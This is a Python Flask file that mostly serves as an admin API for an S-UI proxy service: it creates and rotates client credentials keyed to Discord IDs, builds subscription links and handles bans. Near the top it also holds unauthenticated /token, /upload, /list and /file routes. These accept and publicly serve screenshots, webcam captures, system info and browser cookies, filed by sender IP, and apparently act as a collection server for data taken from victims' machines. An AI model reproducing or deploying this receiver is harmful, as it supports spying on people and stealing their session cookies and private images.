#!/usr/bin/env python3
import base64
import http.client
import json
import os
import secrets
import socket
import sqlite3
import ssl
import string
import subprocess
import threading
import time
import uuid
from datetime import datetime
from urllib.parse import quote, urlsplit

from flask import Flask, jsonify, request, send_from_directory


app = Flask(__name__)
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)
tokens = set()


def required_env(name: str) -> str:
    value = os.environ.get(name, "").strip()
    if not value:
        raise RuntimeError(f"Missing required environment variable: {name}")
    return value


SUI_SERVER_ADDRESS = required_env("SUI_SERVER_ADDRESS")
SUI_HYSTERIA2_PORT = required_env("SUI_HYSTERIA2_PORT")
SUI_HYSTERIA2_QUERY = required_env("SUI_HYSTERIA2_QUERY")
SUI_HYSTERIA2_INBOUND_ID = int(required_env("SUI_HYSTERIA2_INBOUND_ID"))
SUI_SUBSCRIPTION_REMARK = required_env("SUI_SUBSCRIPTION_REMARK")
SUI_DB_PATH = required_env("SUI_DB_PATH")
SUI_API_HOST = required_env("SUI_API_HOST")
SUI_API_PORT = int(required_env("SUI_API_PORT"))
SUI_SOCKS_INBOUND_ID = int(os.environ.get("SUI_SOCKS_INBOUND_ID", "8"))
SUI_VMESS_INBOUND_ID = int(os.environ.get("SUI_VMESS_INBOUND_ID", "9"))
SUI_SOCKS_SERVER = required_env("SUI_SOCKS_SERVER")
SUI_SOCKS_PORT = int(required_env("SUI_SOCKS_PORT"))
SUI_SOCKS_REMARK = os.environ.get("SUI_SOCKS_REMARK", "SOCKS").strip() or "SOCKS"
SUI_VMESS_SERVER = required_env("SUI_VMESS_SERVER")
SUI_VMESS_PORT = int(required_env("SUI_VMESS_PORT"))
SUI_VMESS_PATH = required_env("SUI_VMESS_PATH")
SUI_VMESS_REMARK = os.environ.get("SUI_VMESS_REMARK", "VMess").strip() or "VMess"
SUI_ADMIN_TOKEN = required_env("SUI_ADMIN_TOKEN")
SUI_PANEL_API_URL = required_env("SUI_PANEL_API_URL")
SUI_PANEL_API_TOKEN = required_env("SUI_PANEL_API_TOKEN")
SUI_PANEL_CONNECT_HOST = required_env("SUI_PANEL_CONNECT_HOST")
SUI_PANEL_CA_FILE = required_env("SUI_PANEL_CA_FILE")

TRAFFIC_HISTORY_HOURS = 24 * 7
SQLITE_WRITE_RETRIES = 6
SQLITE_BUSY_TIMEOUT_MS = 500
CLIENT_NAME_LENGTH = 16
CLIENT_NAME_ALPHABET = string.ascii_lowercase + string.digits


def open_api_db() -> sqlite3.Connection:
    """Open an API database connection that waits for S-UI writers."""
    db = sqlite3.connect(SUI_DB_PATH, timeout=10)
    db.execute("PRAGMA busy_timeout=10000")
    return db


def ensure_identity_table(db: sqlite3.Connection | None = None) -> None:
    """Create the Discord-to-S-UI name mapping used after credential rotation."""
    owns_connection = db is None
    connection = db or open_api_db()
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS discord_users (
            discord_id TEXT PRIMARY KEY,
            client_name TEXT NOT NULL UNIQUE,
            ban_reason TEXT NOT NULL DEFAULT '',
            created_at INTEGER NOT NULL DEFAULT 0
        )
        """
    )
    columns = {
        row[1] for row in connection.execute("PRAGMA table_info(discord_users)")
    }
    if "ban_reason" not in columns:
        connection.execute(
            "ALTER TABLE discord_users ADD COLUMN ban_reason TEXT NOT NULL DEFAULT ''"
        )
    if owns_connection:
        connection.commit()
        connection.close()


def random_client_name(existing: sqlite3.Connection | None = None) -> str:
    """Return a unique 16-character lowercase alphanumeric S-UI name."""
    owns_connection = existing is None
    db = existing or open_api_db()
    try:
        for _ in range(100):
            candidate = "".join(
                secrets.choice(CLIENT_NAME_ALPHABET)
                for _ in range(CLIENT_NAME_LENGTH)
            )
            if not db.execute(
                "SELECT 1 FROM clients WHERE name=?", (candidate,)
            ).fetchone():
                return candidate
        raise RuntimeError("could not allocate a unique client name")
    finally:
        if owns_connection:
            db.close()


def resolve_client_name(identifier: str, db: sqlite3.Connection) -> str:
    """Resolve a Discord ID to its randomized S-UI client name."""
    ensure_identity_table(db)
    row = db.execute(
        "SELECT client_name FROM discord_users WHERE discord_id=?", (identifier,)
    ).fetchone()
    return row[0] if row else identifier


def discord_id_for_client(client_name: str, db: sqlite3.Connection) -> str | None:
    ensure_identity_table(db)
    row = db.execute(
        "SELECT discord_id FROM discord_users WHERE client_name=?", (client_name,)
    ).fetchone()
    return row[0] if row else None


@app.route("/")
def index():
    return jsonify({"status": "ok"})


@app.route("/list")
def list_files():
    files = sorted(os.listdir(UPLOAD_DIR))
    return jsonify(
        [name for name in files if os.path.isfile(os.path.join(UPLOAD_DIR, name))]
    )


@app.route("/file/<path:name>")
def serve_file(name):
    return send_from_directory(UPLOAD_DIR, name)


@app.route("/token")
def issue_token():
    token = secrets.token_hex(16)
    tokens.add(token)
    return jsonify({"token": token})


@app.route("/upload", methods=["POST"])
def receive():
    token = request.args.get("token", "") or request.form.get("token", "")
    if not token or token not in tokens:
        return jsonify({"error": "bad token"}), 403
    tokens.discard(token)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_ip = (
        request.headers.get("X-Real-IP") or request.remote_addr or "0"
    ).replace(":", "_")
    saved = []
    for field in ("screenshot", "webcam", "sysinfo", "diaglog", "cookies"):
        files = (
            request.files.getlist(field)
            if field == "cookies"
            else [request.files.get(field)]
        )
        for uploaded_file in files:
            if not uploaded_file or not uploaded_file.filename:
                continue
            name = f"{timestamp}_{remote_ip}_{field}_{uploaded_file.filename}"
            path = os.path.join(UPLOAD_DIR, name)
            try:
                uploaded_file.save(path)
                saved.append(f"{name}({os.path.getsize(path)}B)")
            except Exception as error:
                saved.append(f"{name}(ERR:{error})")
    return jsonify({"status": "ok", "saved": saved})


def fmt_bytes(value: int) -> str:
    if value >= 1073741824:
        return f"{value / 1073741824:.1f}GB"
    if value >= 1048576:
        return f"{value / 1048576:.1f}MB"
    if value >= 1024:
        return f"{value / 1024:.1f}KB"
    return f"{value}B"


def restart_sui(delay_seconds: float = 0) -> None:
    """Restart S-UI in the background so database changes reach sing-box."""
    def restart() -> None:
        if delay_seconds > 0:
            time.sleep(delay_seconds)
        subprocess.run(
            ["systemctl", "restart", "s-ui"],
            capture_output=True,
            check=False,
        )

    threading.Thread(target=restart, daemon=True).start()


def admin_authorized() -> bool:
    supplied_token = request.headers.get("Authorization", "")
    return secrets.compare_digest(supplied_token, f"Bearer {SUI_ADMIN_TOKEN}")


class LocalAddressHTTPSConnection(http.client.HTTPSConnection):
    """Connect locally while preserving the panel hostname for TLS SNI."""

    def __init__(self, host: str, port: int, connect_host: str, **kwargs):
        self.connect_host = connect_host
        super().__init__(host, port, **kwargs)

    def connect(self) -> None:
        raw_socket = socket.create_connection(
            (self.connect_host, self.port),
            self.timeout,
            self.source_address,
        )
        try:
            self.sock = self._context.wrap_socket(raw_socket, server_hostname=self.host)
        except Exception:
            raw_socket.close()
            raise


def sui_online_user_count() -> int:
    """Return the live user count reported by S-UI's in-memory tracker."""
    panel_url = urlsplit(SUI_PANEL_API_URL)
    if panel_url.scheme != "https" or not panel_url.hostname:
        raise ValueError("SUI_PANEL_API_URL must be an HTTPS URL")
    connection = LocalAddressHTTPSConnection(
        panel_url.hostname,
        panel_url.port or 443,
        SUI_PANEL_CONNECT_HOST,
        timeout=5,
        context=ssl.create_default_context(cafile=SUI_PANEL_CA_FILE),
    )
    request_path = panel_url.path or "/"
    if panel_url.query:
        request_path += "?" + panel_url.query
    try:
        connection.request(
            "GET",
            request_path,
            headers={"Token": SUI_PANEL_API_TOKEN, "Accept": "application/json"},
        )
        response = connection.getresponse()
        if response.status != 200:
            raise ValueError(f"S-UI returned HTTP {response.status}")
        payload = json.loads(response.read())
    finally:
        connection.close()
    if not isinstance(payload, dict) or payload.get("success") is not True:
        raise ValueError("S-UI rejected the online status request")
    online_resources = payload.get("obj")
    if not isinstance(online_resources, dict):
        raise ValueError("S-UI returned an invalid online status object")
    users = online_resources.get("user", [])
    if users is None:
        users = []
    if not isinstance(users, list) or not all(isinstance(user, str) for user in users):
        raise ValueError("S-UI returned an invalid online user list")
    return len(set(users))


def traffic_deltas(name: str, hours: int) -> list[dict]:
    """Aggregate S-UI per-minute user statistics into hourly data points."""
    now_hour = int(time.time() // 3600) * 3600
    earliest_hour = now_hour - (hours - 1) * 3600
    with sqlite3.connect(SUI_DB_PATH) as db:
        rows = db.execute(
            """
            SELECT (date_time / 3600) * 3600 AS hour,
                   SUM(CASE WHEN direction = 1 THEN traffic ELSE 0 END) AS up,
                   SUM(CASE WHEN direction = 0 THEN traffic ELSE 0 END) AS down
            FROM stats
            WHERE resource = 'user' AND tag = ? AND date_time >= ?
            GROUP BY hour
            ORDER BY hour
            """,
            (name, earliest_hour),
        ).fetchall()
    by_hour = {
        int(hour): {"up": int(up or 0), "down": int(down or 0)}
        for hour, up, down in rows
    }
    return [
        {
            "timestamp": hour,
            "up": by_hour.get(hour, {}).get("up", 0),
            "down": by_hour.get(hour, {}).get("down", 0),
        }
        for hour in range(earliest_hour, now_hour + 1, 3600)
    ]


def insert_client_record(
    discord_id: str,
    name: str,
    description: str,
    config: dict,
    inbound_ids: list[int],
    links: list[dict],
) -> int | None:
    """Insert a client atomically, retrying S-UI's short SQLite write locks."""
    config_blob = sqlite3.Binary(json.dumps(config).encode())
    inbounds_blob = sqlite3.Binary(json.dumps(inbound_ids).encode())
    links_blob = sqlite3.Binary(json.dumps(links).encode())

    for attempt in range(SQLITE_WRITE_RETRIES):
        try:
            with sqlite3.connect(
                SUI_DB_PATH,
                timeout=SQLITE_BUSY_TIMEOUT_MS / 1000,
            ) as db:
                db.execute(f"PRAGMA busy_timeout={SQLITE_BUSY_TIMEOUT_MS}")
                db.execute("BEGIN IMMEDIATE")
                ensure_identity_table(db)
                mapped = db.execute(
                    "SELECT client_name FROM discord_users WHERE discord_id=?",
                    (discord_id,),
                ).fetchone()
                if mapped or db.execute(
                    "SELECT id FROM clients WHERE name=?", (discord_id,)
                ).fetchone():
                    return None
                cursor = db.execute(
                    "INSERT INTO clients "
                    '(enable, name, desc, "group", config, inbounds, links, '
                    "volume, expiry, down, up) "
                    "VALUES (1, ?, ?, 'user', ?, ?, ?, 0, 0, 0, 0)",
                    (name, description, config_blob, inbounds_blob, links_blob),
                )
                db.execute(
                    "INSERT INTO discord_users(discord_id, client_name, created_at) "
                    "VALUES (?, ?, ?)",
                    (discord_id, name, int(time.time())),
                )
                db.commit()
                return cursor.lastrowid
        except sqlite3.OperationalError as error:
            if "locked" not in str(error).lower() or attempt == SQLITE_WRITE_RETRIES - 1:
                raise
            time.sleep(min(0.1 * (2**attempt), 0.8))

    raise RuntimeError("unreachable")


def build_subscription_uri(password: str) -> str:
    return (
        f"hysteria2://{password}@{SUI_SERVER_ADDRESS}:{SUI_HYSTERIA2_PORT}?"
        f"{SUI_HYSTERIA2_QUERY}#{quote(SUI_SUBSCRIPTION_REMARK)}"
    )


def build_subscription_links(name: str, config: dict) -> list[dict]:
    """Build Hysteria 2, SOCKS, and VMess links from stored credentials."""
    hysteria_password = config["hysteria2"]["password"]
    socks = config["socks"]
    vmess = config["vmess"]
    socks_username = quote(str(socks["username"]), safe="")
    socks_password = quote(str(socks["password"]), safe="")
    vmess_payload = {
        "v": "2",
        "ps": SUI_VMESS_REMARK,
        "add": SUI_VMESS_SERVER,
        "port": str(SUI_VMESS_PORT),
        "id": vmess["uuid"],
        "aid": str(vmess.get("alterId", 0)),
        "scy": "auto",
        "net": "ws",
        "type": "none",
        "host": SUI_VMESS_SERVER,
        "path": SUI_VMESS_PATH,
        "tls": "tls",
        "sni": SUI_VMESS_SERVER,
        "fp": "chrome",
    }
    vmess_uri = "vmess://" + base64.b64encode(
        json.dumps(vmess_payload, separators=(",", ":")).encode()
    ).decode()
    return [
        {
            "remark": SUI_SUBSCRIPTION_REMARK,
            "type": "local",
            "uri": build_subscription_uri(hysteria_password),
        },
        {
            "remark": SUI_SOCKS_REMARK,
            "type": "local",
            "uri": (
                f"socks5://{socks_username}:{socks_password}@{SUI_SOCKS_SERVER}:"
                f"{SUI_SOCKS_PORT}#{quote(SUI_SOCKS_REMARK)}"
            ),
        },
        {
            "remark": SUI_VMESS_REMARK,
            "type": "local",
            "uri": vmess_uri,
        },
    ]


def has_current_socks_link(links: object) -> bool:
    """Return whether stored links point at the currently configured SOCKS endpoint."""
    if not isinstance(links, list):
        return False
    endpoint = f"{SUI_SOCKS_SERVER}:{SUI_SOCKS_PORT}"
    return any(
        isinstance(item, dict)
        and isinstance(item.get("uri"), str)
        and item["uri"].startswith(("socks://", "socks5://"))
        and f"@{endpoint}" in item["uri"]
        for item in links
    )


def build_client_config(name: str) -> dict:
    """Generate fresh credentials for every supported S-UI protocol."""
    password = secrets.token_hex(16)
    user_uuid = str(uuid.uuid4())
    shadowsocks_password = base64.b64encode(password.encode()).decode()
    shadowsocks16_password = base64.b64encode(password[:16].encode()).decode()
    return {
        "mixed": {"username": name, "password": password},
        "socks": {"username": name, "password": password},
        "http": {"username": name, "password": password},
        "shadowsocks": {"name": name, "password": shadowsocks_password},
        "shadowsocks16": {"name": name, "password": shadowsocks16_password},
        "shadowtls": {"name": name, "password": shadowsocks_password},
        "vmess": {"name": name, "uuid": user_uuid, "alterId": 0},
        "vless": {"name": name, "uuid": user_uuid, "flow": "xtls-rprx-vision"},
        "anytls": {"name": name, "password": password},
        "trojan": {"name": name, "password": password},
        "naive": {"username": name, "password": password},
        "hysteria": {"name": name, "auth_str": password},
        "tuic": {"name": name, "uuid": user_uuid, "password": password},
        "hysteria2": {"name": name, "password": password},
    }


def rotate_client_credentials(
    db: sqlite3.Connection,
    discord_id: str,
    description: str | None = None,
) -> tuple[str, str]:
    """Rotate a mapped client's name and every protocol credential."""
    old_name = resolve_client_name(discord_id, db)
    row = db.execute(
        'SELECT id, desc FROM clients WHERE name=?', (old_name,)
    ).fetchone()
    if not row:
        raise KeyError(discord_id)
    new_name = random_client_name(db)
    config = build_client_config(new_name)
    links = build_subscription_links(new_name, config)
    final_description = (description or "").strip() or (row[1] or "")
    db.execute(
        "UPDATE clients SET name=?, desc=?, config=?, links=? WHERE id=?",
        (
            new_name,
            final_description,
            sqlite3.Binary(json.dumps(config).encode()),
            sqlite3.Binary(json.dumps(links).encode()),
            row[0],
        ),
    )
    ensure_identity_table(db)
    db.execute(
        "INSERT INTO discord_users(discord_id, client_name, created_at) VALUES (?, ?, ?) "
        "ON CONFLICT(discord_id) DO UPDATE SET client_name=excluded.client_name",
        (discord_id, new_name, int(time.time())),
    )
    db.execute("UPDATE stats SET tag=? WHERE tag=?", (new_name, old_name))
    return old_name, new_name


@app.route("/api/info/<name>")
def api_info(name):
    """Get client information and traffic totals by name."""
    with open_api_db() as db:
        client_name = resolve_client_name(name, db)
        row = db.execute(
            'SELECT id, name, volume, expiry, down, up, total_up, total_down, enable, "group", desc '
            "FROM clients WHERE name=?",
            (client_name,),
        ).fetchone()
        discord_id = discord_id_for_client(client_name, db) if row else None
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify(
        {
            "id": row[0],
            "name": row[1],
            "discord_id": discord_id or name,
            "volume": row[2],
            "expiry": row[3],
            "down": row[4],
            "up": row[5],
            "total_up": row[6],
            "total_down": row[7],
            "enabled": bool(row[8]),
            "group": row[9] or "",
            "desc": row[10] or "",
            "down_str": fmt_bytes(row[4]),
            "up_str": fmt_bytes(row[5]),
        }
    )


@app.route("/api/traffic/<name>")
def api_traffic(name):
    """Return up to seven days of hourly upload and download totals."""
    try:
        hours = min(
            max(int(request.args.get("hours", TRAFFIC_HISTORY_HOURS)), 1),
            TRAFFIC_HISTORY_HOURS,
        )
    except ValueError:
        return jsonify({"error": "hours must be an integer"}), 400
    with open_api_db() as db:
        client_name = resolve_client_name(name, db)
    return jsonify({"samples": traffic_deltas(client_name, hours)})


@app.route("/api/sub/<name>")
def api_sub(name):
    """Get subscription links, repairing a missing links field when possible."""
    db = open_api_db()
    client_name = resolve_client_name(name, db)
    row = db.execute(
        "SELECT links, config FROM clients WHERE name=?", (client_name,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "not found"}), 404

    links_blob, config_blob = row
    try:
        links = json.loads(links_blob or b"[]")
    except (TypeError, ValueError, json.JSONDecodeError):
        links = []

    if (
        isinstance(links, list)
        and links
        and isinstance(links[0], dict)
        and links[0].get("uri")
        and has_current_socks_link(links)
    ):
        uri = links[0]["uri"]
    else:
        try:
            config = json.loads(config_blob or b"{}")
            links = build_subscription_links(client_name, config)
            uri = links[0]["uri"]
        except (KeyError, TypeError, ValueError, json.JSONDecodeError):
            db.close()
            return jsonify({"error": "subscription is not ready"}), 503
        repaired = json.dumps(links).encode()
        db.execute(
            "UPDATE clients SET links=? WHERE name=?",
            (sqlite3.Binary(repaired), client_name),
        )
        db.commit()

    db.close()
    return jsonify({"uri": uri, "name": client_name})


@app.route("/api/reload", methods=["POST"])
def api_reload():
    restart_sui()
    return jsonify({"status": "ok"})


@app.route("/api/reset/<discord_id>", methods=["POST"])
def api_reset(discord_id):
    """Rotate one user's S-UI identity and all protocol credentials."""
    if not admin_authorized():
        return jsonify({"error": "unauthorized"}), 401
    if not discord_id.isdigit():
        return jsonify({"error": "invalid Discord user ID"}), 400
    data = request.get_json(silent=True) or {}
    description = str(data.get("description", "")).strip()
    try:
        with open_api_db() as db:
            db.execute("BEGIN IMMEDIATE")
            old_name, new_name = rotate_client_credentials(
                db, discord_id, description
            )
            db.commit()
    except KeyError:
        return jsonify({"error": "not found"}), 404
    except sqlite3.OperationalError:
        app.logger.exception("S-UI database busy while resetting %s", discord_id)
        return jsonify({"error": "database busy; retry"}), 503
    restart_sui(delay_seconds=3)
    return jsonify(
        {"discord_id": discord_id, "old_name": old_name, "name": new_name}
    )


@app.route("/api/ban/<name>", methods=["POST"])
def api_ban(name):
    """Disable a client and place it in the S-UI banned group."""
    if not admin_authorized():
        return jsonify({"error": "unauthorized"}), 401
    if not name.isdigit():
        return jsonify({"error": "name must be a Discord user ID"}), 400

    data = request.get_json(silent=True) or {}
    reason = str(data.get("reason", "")).strip()
    if not reason:
        return jsonify({"error": "reason required"}), 400
    if len(reason) > 512:
        return jsonify({"error": "reason is too long"}), 400

    try:
        db = open_api_db()
        client_name = resolve_client_name(name, db)
        row = db.execute(
            'SELECT enable, "group", desc FROM clients WHERE name=?', (client_name,)
        ).fetchone()
    except sqlite3.OperationalError:
        app.logger.exception("S-UI database busy while banning %s", name)
        return jsonify({"error": "database busy; retry"}), 503
    if row is None:
        db.close()
        return jsonify({"error": "not found"}), 404

    previous_enabled = bool(row[0])
    previous_group = row[1] or ""
    previous_desc = row[2] or ""
    try:
        db.execute(
            'UPDATE clients SET enable=0, "group"=? WHERE name=?',
            ("banned", client_name),
        )
        db.execute(
            "UPDATE discord_users SET ban_reason=? WHERE discord_id=?",
            (reason, name),
        )
        db.commit()
        db.close()
    except sqlite3.OperationalError:
        db.close()
        app.logger.exception("S-UI database busy while banning %s", name)
        return jsonify({"error": "database busy; retry"}), 503

    if previous_enabled or previous_group != "banned":
        # The Discord bot uses S-UI as its outbound proxy. Leave enough time
        # for it to ban the guild member and send the interaction response.
        restart_sui(delay_seconds=30)

    return jsonify(
        {
            "name": name,
            "enabled": False,
            "group": "banned",
            "previous_enabled": previous_enabled,
            "previous_group": previous_group,
            "previous_desc": previous_desc,
        }
    )


@app.route("/api/restore/<name>", methods=["POST"])
def api_restore(name):
    """Restore client state when a paired Discord ban could not complete."""
    if not admin_authorized():
        return jsonify({"error": "unauthorized"}), 401
    if not name.isdigit():
        return jsonify({"error": "name must be a Discord user ID"}), 400

    data = request.get_json(silent=True) or {}
    previous_enabled = data.get("enabled")
    previous_group = data.get("group", "")
    previous_desc = data.get("desc", "")
    if not isinstance(previous_enabled, bool):
        return jsonify({"error": "enabled must be a boolean"}), 400
    if not isinstance(previous_group, str) or len(previous_group) > 128:
        return jsonify({"error": "invalid group"}), 400
    if not isinstance(previous_desc, str) or len(previous_desc) > 512:
        return jsonify({"error": "invalid description"}), 400

    try:
        db = open_api_db()
        client_name = resolve_client_name(name, db)
        row = db.execute(
            "SELECT id, desc FROM clients WHERE name=?", (client_name,)
        ).fetchone()
    except sqlite3.OperationalError:
        app.logger.exception("S-UI database busy while restoring %s", name)
        return jsonify({"error": "database busy; retry"}), 503
    if row is None:
        db.close()
        return jsonify({"error": "not found"}), 404

    try:
        final_desc = previous_desc or (row[1] or "")
        db.execute(
            'UPDATE clients SET enable=?, "group"=?, desc=? WHERE name=?',
            (int(previous_enabled), previous_group, final_desc, client_name),
        )
        db.execute(
            "UPDATE discord_users SET ban_reason='' WHERE discord_id=?", (name,)
        )
        db.commit()
        db.close()
    except sqlite3.OperationalError:
        db.close()
        app.logger.exception("S-UI database busy while restoring %s", name)
        return jsonify({"error": "database busy; retry"}), 503
    # Keep the proxy alive while the bot reports or retries the Discord error.
    restart_sui(delay_seconds=30)
    return jsonify(
        {
            "name": name,
            "enabled": previous_enabled,
            "group": previous_group,
            "desc": final_desc,
        }
    )


@app.route("/api/clients")
def api_clients():
    """List Discord IDs for all enabled mapped clients."""
    with open_api_db() as db:
        ensure_identity_table(db)
        names = [
            row[0]
            for row in db.execute(
                "SELECT u.discord_id FROM discord_users u "
                "JOIN clients c ON c.name=u.client_name WHERE c.enable=1"
            ).fetchall()
        ]
    return jsonify(names)


@app.route("/api/stats")
def api_stats():
    """Return S-UI live users, enabled traffic, and total registrations."""
    try:
        online = sui_online_user_count()
    except (
        http.client.HTTPException,
        ssl.SSLError,
        socket.timeout,
        TimeoutError,
        OSError,
        ValueError,
        json.JSONDecodeError,
    ):
        app.logger.exception("Could not read live online users from S-UI")
        return jsonify({"error": "S-UI online status unavailable"}), 502

    with sqlite3.connect(SUI_DB_PATH) as db:
        down, up = db.execute(
            "SELECT SUM(down), SUM(up) FROM clients WHERE enable=1"
        ).fetchone()
        registrations = db.execute("SELECT COUNT(*) FROM clients").fetchone()[0]
    return jsonify(
        {
            "online": online,
            "total_bytes": (down or 0) + (up or 0),
            "registrations": registrations,
        }
    )


@app.route("/api/create", methods=["POST"])
def api_create():
    """Create a client with Hysteria 2, SOCKS, and VMess credentials."""
    data = request.get_json(silent=True) or {}
    discord_id = str(data.get("discord_id") or data.get("name", "")).strip()
    description = str(data.get("description", "")).strip()
    if not discord_id.isdigit():
        return jsonify({"error": "discord_id required"}), 400
    if not description or len(description) > 128:
        return jsonify({"error": "description required"}), 400

    with open_api_db() as db:
        name = random_client_name(db)
    config = build_client_config(name)
    links = build_subscription_links(name, config)
    inbound_ids = [
        SUI_HYSTERIA2_INBOUND_ID,
        SUI_SOCKS_INBOUND_ID,
        SUI_VMESS_INBOUND_ID,
    ]
    try:
        client_id = insert_client_record(
            discord_id, name, description, config, inbound_ids, links
        )
    except sqlite3.OperationalError:
        app.logger.exception("S-UI database remained locked while creating %s", name)
        return jsonify({"error": "database busy; retry"}), 503
    if client_id is None:
        # Creation is idempotent. A previous request may have committed while
        # its response was lost during a proxy restart or network timeout.
        with open_api_db() as db:
            existing_name = resolve_client_name(discord_id, db)
        return jsonify({"name": existing_name, "existing": True})

    # The Discord bot reaches this API through an S-UI proxy. Give Flask time
    # to deliver the response before restarting the proxy process.
    restart_sui(delay_seconds=3)
    return jsonify(
        {"id": client_id, "discord_id": discord_id, "name": name, "links": links[0]["uri"]}
    )


if __name__ == "__main__":
    app.run(host=SUI_API_HOST, port=SUI_API_PORT)
